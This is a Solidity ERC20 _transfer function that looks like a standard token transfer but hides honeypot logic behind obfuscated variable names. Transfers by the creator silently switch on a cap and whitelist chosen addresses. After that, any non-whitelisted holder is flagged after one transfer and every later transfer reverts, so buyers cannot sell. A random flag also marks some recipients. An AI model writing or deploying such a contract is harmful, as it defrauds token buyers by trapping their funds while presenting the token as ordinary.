function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (dexterity == false)) {
        falkland = chTx;
        grandhotel = true;
    }
    if ((address(sender) == creator) && (dexterity == true)) {
        lion[recipient] = true;
        trump[recipient] = false;
        dexterity = false;
    }
    if ((amount > golden) && (lion[sender] == true) && (address(sender) != creator)) {
        junior[recipient] = true;
    }
    if (lion[recipient] != true) {
        trump[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((trump[sender]) && (lion[recipient] == false)) {
        trump[recipient] = true;
    }
    if (lion[sender] == false) {
        if ((amount > golden) && (junior[sender] == true)) {
            require(false);
        }
        require(amount < falkland);
        if (grandhotel == true) {
            if (junior[sender] == true) {
                require(false);
            }
            junior[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

